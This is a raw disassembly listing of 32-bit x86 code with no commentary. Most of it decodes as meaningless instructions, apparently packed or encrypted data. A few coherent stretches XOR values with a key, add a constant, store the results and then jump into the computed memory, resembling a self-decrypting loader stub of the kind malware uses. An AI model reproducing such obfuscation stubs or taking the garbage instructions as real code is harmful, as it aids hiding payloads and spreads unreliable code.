  40c556:	mov    dh,0xf1
  40c558:	adc    BYTE PTR [ecx+0x3b],dl
  40c55b:	hlt    
  40c55c:	mov    DWORD PTR [edx+0x7b555eaf],esi
  40c562:	mov    bl,0x2f
  40c564:	xchg   ebp,eax
  40c565:	idiv   DWORD PTR [edx-0x24]
  40c568:	pop    esi
  40c569:	jmp    FWORD PTR [esi-0x7d99c47f]
  40c56f:	add    dl,bh
  40c571:	xor    eax,0x3cb584d1
  40c576:	aaa    
  40c577:	mov    edi,0x3fdf788
  40c57c:	cdq    
  40c57d:	inc    ecx
  40c57e:	adc    al,0xfb
  40c580:	mov    dh,BYTE PTR [ecx+0x43]
  40c583:	pop    ebx
  40c584:	pop    ebx
  40c585:	sti    
  40c586:	fisttp DWORD PTR [eax-0xdf8087f]
  40c58c:	sbb    ah,ch
  40c58e:	jecxz  0x40c5f9
  40c590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c591:	inc    edx
  40c592:	push   ebx
  40c593:	sub    ebp,DWORD PTR [esi]
  40c595:	fld    QWORD PTR ss:[ecx]
  40c598:	xchg   ecx,eax
  40c599:	fidivr DWORD PTR [edi]
  40c59b:	mov    cl,0x49
  40c59d:	out    dx,al
  40c59e:	inc    ebp
  40c59f:	out    0x35,al
  40c5a1:	cmp    DWORD PTR [edi],eax
  40c5a3:	jg     0x40c548
  40c5a5:	outs   dx,DWORD PTR ds:[esi]
  40c5a6:	rcr    ebx,0xdc
  40c5a9:	popa   
  40c5aa:	sub    bh,BYTE PTR [ecx]
  40c5ac:	aaa    
  40c5ad:	into   
  40c5ae:	dec    eax
  40c5af:	mov    bp,0x24fe
  40c5b3:	sbb    BYTE PTR [eax-0x38],ch
  40c5b6:	imul   esp,DWORD PTR [esi+0x41],0xbf5a204a
  40c5bd:	stc    
  40c5be:	cli    
  40c5bf:	sub    BYTE PTR [ebp+0x48a0f986],0xf5
  40c5c6:	mov    edx,0x9c770fc3
  40c5cb:	sbb    eax,0xa2952ef0
  40c5d0:	jmp    0xc760a606
  40c5d5:	iret   
  40c5d6:	push   ecx
  40c5d7:	mov    esp,0x260c311e
  40c5dc:	mov    WORD PTR [ecx-0x6caf6a24],es
  40c5e2:	lods   al,BYTE PTR ds:[esi]
  40c5e3:	(bad)  
  40c5e4:	pop    esi
  40c5e5:	xchg   ecx,eax
  40c5e6:	sbb    ecx,edx
  40c5e8:	sub    eax,0x1a16786d
  40c5ed:	in     eax,0x8a
  40c5ef:	call   0xe7bb:0x80c82125
  40c5f6:	xchg   BYTE PTR [edi],ch
  40c5f8:	push   cs
  40c5f9:	inc    ebx
  40c5fa:	dec    esp
  40c5fb:	test   al,0xc9
  40c5fd:	pop    edi
  40c5fe:	test   eax,0xcc2459fc
  40c603:	cld    
  40c604:	fist   DWORD PTR [esi+0x3746a3b1]
  40c60a:	mov    ebp,0x3fdf81d2
  40c60f:	aaa    
  40c610:	xchg   DWORD PTR [eax-0x3d],esp
  40c613:	adc    al,0x3a
  40c615:	xchg   ebx,eax
  40c616:	push   ds
  40c617:	pop    edi
  40c618:	(bad)  
  40c619:	out    0xfb,al
  40c61b:	inc    edx
  40c61c:	push   edx
  40c61d:	push   0xbce32da6
  40c622:	fs dec ebp
  40c624:	pop    eax
  40c625:	sub    al,0xb1
  40c627:	repz push edx
  40c629:	icebp  
  40c62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c62b:	out    0x33,eax
  40c62d:	arpl   WORD PTR [eax],sp
  40c62f:	and    BYTE PTR ds:0xcf06705e,dh
  40c635:	add    ah,BYTE PTR [edx]
  40c637:	push   esp
  40c638:	sti    
  40c639:	in     eax,0xc6
  40c63b:	sahf   
  40c63c:	aas    
  40c63d:	jmp    0x40c5c0
  40c63f:	fiadd  DWORD PTR [eax+0x191f0290]
  40c645:	cmp    BYTE PTR [ecx+ecx*1-0x351a5c91],ch
  40c64c:	push   edx
  40c64d:	dec    esp
  40c64e:	dec    DWORD PTR [edx-0x2cd3c7b5]
  40c654:	out    0x5d,al
  40c656:	fisubr WORD PTR [ebp+0x51]
  40c659:	jae    0x40c609
  40c65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c65c:	inc    esi
  40c65d:	sti    
  40c65e:	pop    ss
  40c65f:	cli    
  40c660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c661:	inc    ecx
  40c662:	mov    ss,WORD PTR [ebx]
  40c664:	bound  ecx,QWORD PTR [esp+ebp*2+0x4626ec31]
  40c66b:	and    bl,ch
  40c66d:	cmp    esi,DWORD PTR ds:0x7af092b1
  40c673:	(bad)  
  40c675:	out    dx,eax
  40c676:	loop   0x40c60a
  40c678:	cdq    
  40c679:	je     0x40c6bc
  40c67b:	dec    ebp
  40c67c:	rcr    BYTE PTR [ebp+0xac854d6],1
  40c682:	js     0x40c644
  40c684:	aam    0xac
  40c686:	sbb    eax,edi
  40c688:	xchg   esp,eax
  40c689:	sbb    al,0x1
  40c68b:	addr16 mov ebx,0x4f37f24d
  40c691:	inc    esp
  40c692:	jecxz  0x40c618
  40c694:	pop    eax
  40c695:	jmp    0x40c62c
  40c697:	test   al,0xbe
  40c699:	fwait
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x3e0b653f],dl
  40c6de:	or     ch,0xde
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c6cd
  40c6e9:	jb     0x40c6d1
  40c6eb:	iret   
  40c6ec:	fwait
  40c6ed:	inc    eax
  40c6ee:	sub    DWORD PTR [esi+0x6eec1f72],ebx
  40c6f4:	dec    eax
  40c6f5:	loopne 0x40c68c
  40c6f7:	cmc    
  40c6f8:	push   ecx
  40c6f9:	sub    al,0xa2
  40c6fb:	and    esp,edi
  40c6fd:	sar    eax,0x9b
  40c700:	push   0x49
  40c702:	cmc    
  40c703:	mov    ?,WORD PTR [ecx]
  40c705:	aad    0x26
  40c707:	sub    al,BYTE PTR [esi-0x4]
  40c70a:	mov    esi,0xa9ecfce
  40c70f:	and    edx,eax
  40c711:	out    0x68,al
  40c713:	ds push ds
  40c715:	mov    ?,WORD PTR [edx]
  40c717:	push   ss
  40c718:	out    0xa4,al
  40c71a:	nop
  40c71b:	jmp    0x40c6da
  40c71d:	push   eax
  40c71e:	lock call 0x11abc7cc
  40c724:	sbb    BYTE PTR [ebx-0x3eef9bd8],bh
  40c72a:	cmp    eax,0xd80c3dc8
  40c72f:	mov    DWORD PTR [ecx],ecx
  40c731:	cmp    BYTE PTR [eax+eax*1+0x35],cl
  40c735:	dec    esp
  40c736:	push   eax
  40c737:	ss push ebx
  40c739:	push   es
  40c73a:	mov    dh,0x7d
  40c73c:	mov    eax,ds:0x51c43d6a
  40c741:	retf   
  40c742:	std    
  40c743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c744:	jbe    0x40c734
  40c746:	add    ah,ch
  40c748:	add    BYTE PTR [ecx-0x21],bl
  40c74b:	rol    bh,0xb6
  40c74e:	cmc    
  40c74f:	jmp    0x9feb2d65
  40c754:	and    DWORD PTR [eax],0xffffffb2
  40c757:	mov    edi,fs
  40c759:	mov    WORD PTR [ebx+0x5f8abf76],fs
  40c75f:	pop    eax
  40c760:	aad    0x55
  40c762:	mov    edi,0x931355cd
  40c767:	push   0xffffff8e
  40c769:	mov    al,ds:0x9e4c56ac
  40c76e:	dec    esp
  40c76f:	cdq    
  40c770:	(bad)  
  40c772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c773:	jg     0x40c712
  40c775:	jno    0x40c7eb
  40c777:	icebp  
  40c778:	push   ebp
  40c779:	mov    edi,esi
  40c77b:	ja     0x40c77d
  40c77d:	cmp    BYTE PTR [eax],0xa6
  40c780:	imul   edi,DWORD PTR [edi],0xffffffa6
  40c783:	push   ebp
  40c784:	hlt    
  40c785:	cmp    BYTE PTR [ebp+0x4],bl
  40c788:	cmp    eax,ebx
  40c78a:	shl    esi,0x97
  40c78d:	loop   0x40c74f
  40c78f:	mov    WORD PTR [ecx+0x49],es
  40c792:	scas   eax,DWORD PTR es:[edi]
  40c793:	push   edx
  40c794:	push   eax
  40c795:	adc    BYTE PTR [ecx+eiz*4-0x74],bh
  40c799:	(bad)  
  40c79a:	rcl    BYTE PTR [edx+0x21],1
  40c79d:	ja     0x40c72f
  40c79f:	inc    edx
  40c7a0:	sbb    ebx,ebx
  40c7a2:	dec    edi
  40c7a3:	pop    ebx
  40c7a4:	imul   esp,edx,0xffffffc0
  40c7a7:	cmp    BYTE PTR [ecx-0x7f1d931c],bh
  40c7ad:	xchg   edi,eax
  40c7ae:	sub    BYTE PTR [edx+0x7],cl
  40c7b1:	js     0x40c7fb
  40c7b3:	div    BYTE PTR [edx-0x1f]
  40c7b6:	mov    WORD PTR [ecx],es
  40c7b8:	mov    ebx,0xa897d51a
  40c7bd:	ds jge 0x40c76b
  40c7c0:	push   edx
  40c7c1:	out    0x85,al
  40c7c3:	pop    ds
  40c7c4:	jg     0x40c842
  40c7c6:	das    
  40c7c7:	adc    ebx,DWORD PTR [edx+0x1]
  40c7ca:	add    dh,ch
  40c7cc:	enter  0xefcf,0xcb
  40c7d0:	lahf   
  40c7d1:	pop    edx
  40c7d2:	inc    edx
  40c7d3:	ret    
  40c7d4:	cwde   
  40c7d5:	mov    bl,0xc0
  40c7d7:	jbe    0x40c784
  40c7d9:	enter  0x25b6,0xb2
  40c7dd:	(bad)  
  40c7de:	(bad)  
  40c7df:	sti    
  40c7e0:	std    
  40c7e1:	push   ecx
  40c7e2:	add    ecx,DWORD PTR [ecx]
  40c7e4:	and    eax,0x1368128
  40c7e9:	jb     0x40c862
  40c7eb:	enter  0xa9d,0x55
  40c7ef:	rol    BYTE PTR [ebx],1
  40c7f1:	cwde   
  40c7f2:	pusha  
  40c7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7f4:	inc    ecx
  40c7f5:	push   0x73
  40c7f7:	js     0x40c7ef
  40c7f9:	jb     0x40c7e9
  40c7fb:	(bad)  
  40c7fc:	(bad)  
  40c7fd:	mov    al,ds:0xff01253d
  40c802:	adc    cl,BYTE PTR [eax+0x5612675]
  40c808:	leave  
  40c809:	sub    bh,BYTE PTR [edi-0x5]
  40c80c:	xchg   ebx,eax
  40c80d:	aas    
  40c80e:	dec    esi
  40c80f:	aam    0x1a
  40c811:	in     eax,dx
  40c812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c813:	pop    ebp
  40c814:	mov    gs,WORD PTR [edx]
  40c816:	popf   
  40c817:	rcr    eax,1
  40c819:	(bad)  
  40c81a:	cmp    eax,0x17dd24d
  40c81f:	mov    ecx,0xef7eec39
  40c824:	cdq    
  40c825:	addr16 jl 0x40c83e
  40c828:	dec    esi
  40c829:	loopne 0x40c89f
  40c82b:	into   
  40c82c:	iret   
  40c82d:	mov    edx,0x38d505d4
  40c832:	pushf  
  40c833:	sar    BYTE PTR [eax+0x4f],1
  40c836:	out    dx,eax
  40c837:	or     esp,edx
  40c839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83a:	in     eax,dx
  40c83b:	mov    al,ds:0x1d5adf4
  40c840:	js     0x40c802
  40c842:	test   ebx,esp
  40c844:	addr16 xchg ebx,eax
  40c846:	fbstp  TBYTE PTR [ecx]
  40c848:	pop    ecx
  40c849:	xchg   esp,eax
  40c84a:	cmp    al,0xbf
  40c84c:	mov    DWORD PTR [ebp-0x59],edi
  40c84f:	test   DWORD PTR [edi-0x7be7d0ad],0x5b3deb65
  40c859:	sbb    ebx,DWORD PTR [esi]
  40c85b:	stos   DWORD PTR es:[edi],eax
  40c85c:	pop    esp
  40c85d:	add    eax,0xad59792c
  40c862:	dec    eax
  40c863:	inc    eax
  40c864:	and    DWORD PTR [ebx+0x7],ebx
  40c867:	mov    ecx,0x469e64ea
  40c86c:	pop    ecx
  40c86d:	sbb    eax,0x32479f06
  40c872:	js     0x40c8a5
  40c874:	mov    edx,0xaff529a9
  40c879:	ss retf 
  40c87b:	int3   
  40c87c:	pop    ecx
  40c87d:	clc    
  40c87e:	inc    esp
  40c87f:	lea    ebx,[esi+0x559408fd]
  40c885:	imul   ebx,ebp,0xd25f3bb4
  40c88b:	pop    ds
  40c88c:	or     eax,0xf015551a
  40c891:	jbe    0x40c8be
  40c893:	xor    esp,edi
  40c895:	clc    
  40c896:	stos   DWORD PTR es:[edi],eax
  40c897:	mov    al,ds:0xa5d6bb85
  40c89c:	pop    edx
  40c89d:	xchg   ebx,eax
  40c89e:	ja     0x40c88a
  40c8a0:	xor    DWORD PTR [ebx-0x3507df81],ebx
  40c8a6:	cmp    bl,dl
  40c8a8:	ins    DWORD PTR es:[edi],dx
  40c8a9:	sbb    al,0xda
  40c8ab:	push   ds
  40c8ac:	push   edi
  40c8ad:	jmp    0x3788:0x7b57b788
  40c8b4:	mov    bl,0x22
  40c8b6:	rcr    DWORD PTR [edx+ebp*4-0x4e],1
  40c8ba:	ror    BYTE PTR [ecx+edi*1+0x15be8142],1
  40c8c1:	xchg   BYTE PTR [esi+ebx*2],bl
  40c8c4:	icebp  
  40c8c5:	adc    dx,WORD PTR [edx]
  40c8c8:	fild   DWORD PTR [edi-0x78970d3]
  40c8ce:	mov    dl,0x76
  40c8d0:	(bad)  
  40c8d1:	popa   
  40c8d2:	mov    al,ds:0x55b05977
  40c8d7:	fdiv   QWORD PTR [eax+0x7f674608]
  40c8dd:	test   dl,dh
  40c8df:	inc    edi
  40c8e0:	stc    
  40c8e1:	enter  0xf0df,0x74
  40c8e5:	ins    DWORD PTR es:[edi],dx
  40c8e6:	mov    ecx,0x3d55a242
  40c8eb:	cmp    al,0x99
  40c8ed:	mov    edx,0xdf44046b
  40c8f2:	out    0xa8,al
  40c8f4:	mov    eax,0xd77cb9de
  40c8f9:	div    DWORD PTR [edi-0x69a335cf]
  40c8ff:	icebp  
  40c900:	mov    ebp,0xe70617a4
  40c905:	cwde   
  40c906:	mov    edx,0xcb9a372c
  40c90b:	sub    bh,bh
  40c90d:	adc    al,0xd0
  40c90f:	ds popa 
  40c911:	cld    
  40c912:	mov    ecx,0xf0776fb7
  40c917:	ret    
  40c918:	xlat   BYTE PTR ds:[ebx]
  40c919:	stos   BYTE PTR es:[edi],al
  40c91a:	jecxz  0x40c92d
  40c91c:	aam    0xde
  40c91e:	lds    esi,FWORD PTR [edx-0x6647c998]
  40c924:	and    eax,0x2c56cf1a
  40c929:	ficom  WORD PTR [ecx-0x74e8cbd3]
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ecx-0x6c],eax
  40c946:	je     0x40c90a
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	jnp    0x40c8f5
  40c952:	fisttp DWORD PTR [ebx+0x4354d3ea]
  40c958:	imul   edi,DWORD PTR [esi+0xa],0x7
  40c95c:	ins    BYTE PTR es:[edi],dx
  40c95d:	add    BYTE PTR [eax-0x62],bh
  40c960:	jmp    0xe12b:0x1faff7ab
  40c967:	mov    cl,0xb0
  40c969:	outs   dx,BYTE PTR ds:[esi]
  40c96a:	xchg   BYTE PTR [eax+0x4c249fcf],ah
  40c970:	push   ebx
  40c971:	and    eax,0xdf04590b
  40c976:	xchg   ecx,eax
  40c977:	push   ebx
  40c978:	sub    bl,BYTE PTR ds:0xbcbed27b
  40c97e:	loop   0x40c986
  40c980:	scas   eax,DWORD PTR es:[edi]
  40c981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c982:	retf   
  40c983:	enter  0xb947,0x89
  40c987:	inc    esi
  40c988:	into   
  40c989:	mov    edi,0xa7ab7c9
  40c98e:	push   ecx
  40c98f:	jb     0x40c912
  40c991:	xchg   ecx,eax
  40c992:	cli    
  40c993:	scas   eax,DWORD PTR es:[edi]
  40c994:	mov    esi,esp
  40c996:	and    BYTE PTR [ebx],bh
  40c998:	es push ecx
  40c99a:	pushf  
  40c99b:	pop    edx
  40c99c:	adc    cl,BYTE PTR [ecx-0x378c2790]
  40c9a2:	fbstp  TBYTE PTR [ebp*2+0x6d99184f]
  40c9a9:	in     al,dx
  40c9aa:	inc    eax
  40c9ab:	nop
  40c9ac:	dec    ebx
  40c9ad:	and    al,0x5b
  40c9af:	imul   edx,DWORD PTR ds:0xe0fffa90,0xe308e5bc
  40c9b9:	outs   dx,BYTE PTR cs:[esi]
  40c9bb:	inc    eax
  40c9bc:	out    0x8,eax
  40c9be:	cmp    edx,ebp
  40c9c0:	or     bl,BYTE PTR [edx+edx*8+0x5003bc87]
  40c9c7:	das    
  40c9c8:	outs   dx,DWORD PTR ds:[esi]
  40c9c9:	(bad)  
  40c9cb:	call   0x69980d40
  40c9d0:	pop    ds
  40c9d1:	xor    eax,0xa9d62b4d
  40c9d6:	adc    eax,0xddfff232
  40c9db:	push   ds
  40c9dc:	push   0x827a5a96
  40c9e1:	inc    eax
  40c9e2:	pop    ds
  40c9e3:	or     al,dl
  40c9e5:	out    dx,eax
  40c9e6:	sbb    eax,0xf578c39e
  40c9eb:	xchg   BYTE PTR [ebx],bl
  40c9ed:	call   0xa70bd0e4
  40c9f2:	jg     0x40c9f6
  40c9f4:	icebp  
  40c9f5:	or     edx,edx
  40c9f7:	pop    eax
  40c9f8:	rol    DWORD PTR [edx+0x1efa87b5],1
  40c9fe:	dec    ebp
  40c9ff:	xor    BYTE PTR [ebx-0x3ccb143a],ch
  40ca05:	cmp    edx,DWORD PTR [ebx]
  40ca07:	stos   BYTE PTR es:[edi],al
  40ca08:	or     eax,0x561797fc
  40ca0d:	scas   al,BYTE PTR es:[edi]
  40ca0e:	into   
  40ca0f:	jg     0x40ca45
  40ca11:	ror    DWORD PTR [edx-0x51],1
  40ca14:	mov    edx,esi
  40ca16:	pop    edi
  40ca17:	cmp    ah,BYTE PTR [eax+eiz*4-0x5bcc9de0]
  40ca1e:	test   al,0xb0
  40ca20:	adc    al,dl
  40ca22:	fmul   DWORD PTR [esi+0x53e6e32e]
  40ca28:	jae    0x40ca45
  40ca2a:	mov    al,ds:0x99b873b2
  40ca2f:	add    eax,0xd580b01a
  40ca34:	aas    
  40ca35:	jbe    0x40ca1c
  40ca37:	popa   
  40ca38:	data16 scas al,BYTE PTR es:[edi]
  40ca3a:	inc    edi
  40ca3b:	xchg   ebp,eax
  40ca3c:	cmp    eax,0x3e08286f
  40ca41:	imul   eax,ebx,0x5e
  40ca44:	pop    esp
  40ca45:	cli    
  40ca46:	mov    al,BYTE PTR [ecx]
  40ca48:	outs   dx,DWORD PTR ds:[esi]
  40ca49:	jmp    0x40ca6d
  40ca4b:	inc    ebp
  40ca4c:	mov    edx,0x2e1d8b77
  40ca51:	jb     0x40ca3e
  40ca53:	ror    DWORD PTR [esi+ebx*8-0x20691ef0],1
  40ca5a:	(bad)  
  40ca5b:	dec    ecx
  40ca5c:	inc    ebp
  40ca5d:	cmp    al,0xa7
  40ca5f:	push   ss
  40ca60:	aam    0x8e
  40ca62:	lods   eax,DWORD PTR ds:[esi]
  40ca63:	out    0xb9,eax
  40ca65:	out    0x9a,eax
  40ca67:	icebp  
  40ca68:	or     al,0x90
  40ca6a:	or     DWORD PTR ds:0x478601a2,esp
  40ca70:	cmp    cl,BYTE PTR [ebx-0x1ac8af10]
  40ca76:	rol    DWORD PTR [edx-0x65c08118],cl
  40ca7c:	arpl   WORD PTR [ebx-0x5c],cx
  40ca7f:	xchg   esp,eax
  40ca80:	sbb    al,0x70
  40ca82:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40ca84:	push   edx
  40ca85:	mov    BYTE PTR [bx-0x1317],ch
  40ca8a:	mov    ds:0x9857e06,eax
  40ca8f:	mov    dh,0x95
  40ca91:	ficom  DWORD PTR [eax+0x62cac874]
  40ca97:	push   ebp
  40ca98:	dec    esi
  40ca99:	adc    esi,esp
  40ca9b:	lahf   
  40ca9c:	mov    ebp,0x9afd6831
  40caa1:	mov    bl,0x46
  40caa3:	mov    dl,0x28
  40caa5:	pop    edx
  40caa6:	xor    edi,esi
  40caa8:	test   DWORD PTR [esi-0x68],ebp
  40caab:	jecxz  0x40cb21
  40caad:	pop    ebp
  40caae:	pop    ds
  40caaf:	js     0x40ca98
  40cab1:	jl     0x40ca7c
  40cab3:	jae    0x40cade
  40cab5:	fs push ebx
  40cab7:	adc    esi,DWORD PTR ds:0xf1c1f5ef
  40cabd:	jge    0x40ca68
  40cabf:	xor    esi,edx
  40cac1:	outs   dx,DWORD PTR ds:[esi]
  40cac2:	pop    ebp
  40cac3:	sub    eax,0x9c5a0c80
  40cac8:	push   ds
  40cac9:	xor    esp,DWORD PTR [esi-0x5a]
  40cacc:	push   ebx
  40cacd:	leave  
  40cace:	pop    esi
  40cacf:	pop    edx
  40cad0:	cli    
  40cad1:	stos   DWORD PTR es:[edi],eax
  40cad2:	mul    ah
  40cad4:	sti    
  40cad5:	sbb    DWORD PTR [ecx-0x4bb7c0ab],ebp
  40cadb:	out    0x75,al
  40cadd:	hlt    
  40cade:	push   ebp
  40cadf:	dec    esi
  40cae0:	hlt    
  40cae1:	dec    esp
  40cae2:	out    0x97,al
  40cae4:	inc    edi
  40cae5:	arpl   WORD PTR [eax-0x17293641],sp
  40caeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caec:	popa   
  40caed:	jmp    0xfc45:0x85256492
  40caf4:	imul   ebp,DWORD PTR [ecx-0x5d],0xb2927bc9
  40cafb:	push   cs
  40cafc:	cli    
  40cafd:	mov    dh,0x8b
  40caff:	inc    esp
  40cb00:	mov    esi,0xe3f4c156
  40cb05:	aas    
  40cb06:	sar    cl,1
  40cb08:	lgs    eax,FWORD PTR [edi+0x21]
  40cb0c:	ret    
  40cb0d:	dec    ebp
  40cb0e:	lods   eax,DWORD PTR ds:[esi]
  40cb0f:	cmp    ecx,DWORD PTR [ebp-0x59]
  40cb12:	mov    al,0xd1
  40cb14:	inc    edi
  40cb15:	leave  
  40cb16:	adc    BYTE PTR [esi-0x79],al
  40cb19:	mov    dl,BYTE PTR [esi-0x5f7979bc]
  40cb1f:	int    0x6d
  40cb21:	adc    eax,0x3bd5b323
  40cb26:	lods   al,BYTE PTR ds:[esi]
  40cb27:	jne    0x40cb5a
  40cb29:	stc    
  40cb2a:	neg    DWORD PTR [edi-0x4df7291c]
  40cb30:	sub    ebp,DWORD PTR [esi+0xe]
  40cb33:	cmp    al,0x94
  40cb35:	xchg   ebx,eax
  40cb36:	push   ebx
  40cb37:	sar    ah,cl
  40cb39:	mov    DWORD PTR [edi],esp
  40cb3b:	(bad)  
  40cb3c:	xor    dh,cl
  40cb3e:	sti    
  40cb3f:	jl     0x40cb0c
  40cb41:	or     BYTE PTR [ecx-0x19],ah
  40cb44:	inc    ecx
  40cb45:	add    dl,BYTE PTR [ebp+0x3b]
  40cb48:	gs and al,0x20
  40cb4b:	loope  0x40cb63
  40cb4d:	ins    BYTE PTR es:[edi],dx
  40cb4e:	daa    
  40cb4f:	adc    eax,0x6fe135ce
  40cb54:	adc    eax,DWORD PTR [ebx-0x46b6a461]
  40cb5a:	pop    ebp
  40cb5b:	inc    esp
  40cb5c:	or     al,0xaa
  40cb5e:	adc    eax,0x900fef5d
  40cb63:	add    ebx,ebx
  40cb65:	inc    esp
  40cb66:	push   edx
  40cb67:	xchg   ebp,eax
  40cb68:	cmp    eax,0x83e60680
  40cb6d:	mov    eax,ds:0x259c48d
  40cb72:	mov    ah,0xd9
  40cb74:	sbb    dl,BYTE PTR [eax+0x32]
  40cb77:	and    ebp,DWORD PTR [eax+0x24b851c7]
  40cb7d:	xchg   esi,eax
  40cb7e:	xlat   BYTE PTR ds:[ebx]
  40cb7f:	mov    edi,0x53af46ce
  40cb84:	add    al,0xa2
  40cb86:	stc    
  40cb87:	es dec esi
  40cb89:	cld    
  40cb8a:	pusha  
  40cb8b:	push   eax
  40cb8c:	(bad)  
  40cb8d:	pop    ebp
  40cb8e:	pop    ds
  40cb8f:	sbb    DWORD PTR [ecx],eax
  40cb91:	push   ebp
  40cb92:	sub    ecx,DWORD PTR [ecx-0x39fcfc49]
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x2c]
  40cbfc:	test   eax,0x8c623c82
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	jmp    0xf2a0727e
  40cc0c:	sub    eax,0x9051cf4f
  40cc11:	mov    WORD PTR [ebx+ecx*4+0x647bb1bb],ss
  40cc18:	bound  esi,QWORD PTR [esi]
  40cc1a:	call   0x754a3655
  40cc1f:	sub    DWORD PTR [ebx+0x7c],ecx
  40cc22:	retf   0x9ed4
  40cc25:	lahf   
  40cc26:	inc    edx
  40cc27:	add    al,BYTE PTR [esi+0x2f]
  40cc2a:	jae    0x40cc1b
  40cc2c:	sahf   
  40cc2d:	jbe    0x40cbdd
  40cc2f:	in     al,dx
  40cc30:	pop    ecx
  40cc31:	sbb    dh,BYTE PTR [eax+0x20e56de9]
  40cc37:	adc    eax,0x1ad53cae
  40cc3c:	push   edx
  40cc3d:	sub    eax,0x23f70146
  40cc42:	mov    ds:0xf04c2f64,eax
  40cc47:	sbb    al,0x96
  40cc49:	lea    eax,[eax-0x54]
  40cc4c:	xor    eax,0x7dfa68a2
  40cc51:	nop
  40cc52:	add    ebx,esp
  40cc54:	add    edx,eax
  40cc56:	pushf  
  40cc57:	mov    WORD PTR [edx-0x70],?
  40cc5a:	xchg   esp,eax
  40cc5b:	sbb    BYTE PTR [ebx-0x15],dl
  40cc5e:	mov    cs,WORD PTR [eax+eax*4-0x60]
  40cc62:	mov    dh,0x87
  40cc64:	mov    edx,0xf1cb61b
  40cc69:	dec    edi
  40cc6a:	aad    0x8a
  40cc6c:	rcr    BYTE PTR [edi+ebp*2-0x1c663e50],1
  40cc73:	loop   0x40ccec
  40cc75:	mov    al,ds:0x2148a995
  40cc7a:	pop    edi
  40cc7b:	retf   
  40cc7c:	fdivr  QWORD PTR ds:0x17c9df12
  40cc82:	ret    0x8853
  40cc85:	or     eax,0x87b90e36
  40cc8a:	in     eax,0x87
  40cc8c:	dec    esp
  40cc8d:	or     eax,0x9f80ac6c
  40cc92:	aad    0x44
  40cc94:	jecxz  0x40cc37
  40cc96:	data16 ror dh,cl
  40cc99:	aaa    
  40cc9a:	sbb    esi,DWORD PTR [ebp-0x68]
  40cc9d:	or     ah,BYTE PTR [esi+ecx*1]
  40cca0:	dec    ecx
  40cca1:	and    al,0x7f
  40cca3:	pushf  
  40cca4:	lock cld 
  40cca6:	lahf   
  40cca7:	ss jmp 0x243ef459
  40ccad:	test   DWORD PTR [edx+0xe],esp
  40ccb0:	ja     0x40cc43
  40ccb2:	mov    ds:0x421d65d6,al
  40ccb7:	sub    ebp,ecx
  40ccb9:	inc    ebp
  40ccba:	fcom   DWORD PTR [ebp+ebx*2-0x3a]
  40ccbe:	mov    ds:0xa5004e38,al
  40ccc3:	jg     0x40ccee
  40ccc5:	fs cld 
